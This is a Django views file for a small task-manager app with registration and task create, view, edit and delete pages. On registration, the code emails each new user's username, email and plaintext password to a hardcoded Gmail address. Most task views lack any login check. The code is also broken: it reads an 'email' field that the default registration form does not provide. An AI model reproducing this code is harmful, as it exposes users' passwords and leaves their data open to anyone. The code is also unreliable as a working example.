from django.shortcuts import render, redirect
from django.core.mail import send_mail, BadHeaderError
from django.contrib.auth.forms import UserCreationForm
from django.http import HttpResponse
from django.contrib.auth import logout
from django.contrib.auth.decorators import login_required
from .models import *
from .forms import *

# Create your views here.
def home(request):
    return render(request, "home/index.html")

def about(request):
    return render(request, 'home/about.html')

def register(request):
    if request.method == 'POST':
        form = UserCreationForm(request.POST)
        if form.is_valid():
            form.save()
            subject = "New user registered"
            body = {
                'username': form.cleaned_data['username'],
                'email': form.cleaned_data['email'],
                'password': form.cleaned_data['password1'],
            }
            message="\n".join(body.values())
            try:
                send_mail(subject, message, 'lebisha0thapa@gmail.com', ['lebisha0thapa@gmail.com'])
            except BadHeaderError:
                return HttpResponse('Invalid Bound')
            return redirect('home')
    else:
        form = UserCreationForm()
    return render(request, 'auth/register.html', context={'form': form})

def logout_view(request):
    logout(request)
    return redirect('home')

def contact(request):
    return render(request, 'home/contact.html')

@login_required(login_url='login')
def task(request):
    tasks = Task.objects.all()
    context = {'tasks':tasks}
    return render(request, 'task/index.html', context)

def addtask(request):
    if request.method == "GET":
        task_form = TaskForm
        return render(request, 'task/add_task.html', context={'form':task_form})
    else:
        task_form = TaskForm(request.POST, request.FILES)
        if task_form.is_valid():
            task_form.save()
            return redirect('task')
    return render(request, 'task/add_task.html', context={'form':task_form})

def viewtask(request, task_id):
    tasks = Task.objects.get(id = task_id)
    context = {'tasks':tasks}
    return render(request, 'task/view_task.html', context)

def edit_task(request, task_id):
    tasks = Task.objects.get(id = task_id)
    if request.method == "POST":
        form = TaskForm(instance=tasks)
        form = TaskForm(request.POST, request.FILES, instance=tasks)
        if form.is_valid():
            form.save()
            return redirect('task')
    else:
        form = TaskForm(instance=tasks)
    return render(request, 'task/edit_task.html', {'form':form})

def delete_task(request, task_id):
    task = Task.objects.get(id = task_id)
    if request.method == "POST":
        task.delete()
        return redirect('task')
    else:
        return render(request, 'task/delete_task.html', {'task': task})